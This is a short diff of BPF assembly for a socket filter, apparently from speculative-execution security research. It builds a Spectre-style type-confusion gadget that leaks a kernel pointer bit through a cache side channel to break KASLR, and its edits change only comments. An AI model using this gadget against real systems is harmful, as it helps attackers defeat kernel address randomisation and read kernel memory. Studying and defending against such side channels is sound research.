@@ -227,7 +227,7 @@ LBB0_5:
 	# Create Spec. Type Confusion:
     r2 = 0   # scalar Y for type confusion
 	if r1 == 0 goto SCALAR_UNKNOWN # branch based on user input
-	r2 = 1   # needed to prevent dead-code-elim. for port-contention block
+	r2 = 1   # needed to prevent dead-code-elim. for secret-based branch
 SCALAR_UNKNOWN:
     *(u64 *)(r10 - 64) = r6 # fp[-64] = ptr
 	# lfence added here because of prev. spill of ptr to stack.
@@ -244,11 +244,13 @@ SCALAR_UNKNOWN:
 	# Leak ptr using cache side-channel, break KASLR.
 	r8 &= 1  # choose bit to leak
 	if r8 == 0 goto	END
+	# arch. dead code if r1 is 0, only executes spec. iff ptr bit is 1
 	r2 = *(u32 *)(r7 + 20) # encode bit in cache (0: slow, 1: fast)
 END:
     #
 	# Spec. Gadget End
 	#
+	# Ignore the rest.
 	*(u32 *)(r7 + 20) = r1
 	.loc	0 63 2 is_stmt 1                # sockfilter.bpf.c:63:2
 .Ltmp72:
